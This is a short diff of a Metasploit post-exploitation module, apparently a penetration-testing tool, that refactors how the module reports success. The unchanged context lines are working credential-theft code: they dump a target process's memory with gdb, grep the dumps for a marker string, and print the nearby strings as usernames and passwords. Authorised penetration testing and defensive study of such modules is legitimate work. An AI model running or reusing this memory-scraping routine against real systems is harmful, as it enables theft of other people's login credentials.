@@ -64,12 +64,13 @@ class MetasploitModule < Msf::Post
     cmd << 'sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | '
     cmd << "while read start stop; do /usr/bin/gdb --batch-silent --silent --pid #{pid} -ex \"dump memory #{tmp_path}#{pid}-$start-$stop.dump 0x$start 0x$stop\"; done 2>/dev/null; echo $?"
     dump = cmd_exec(cmd)
-    if dump.chomp.to_i == 0
-      vprint_good('Succesfully dump.')
-    else
+
+    if dump.chomp.to_i != 0
       print_warning('Could not dump process.')
       return
     end
+
+    vprint_good('Process dumped successfully.')
 
     strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")
 
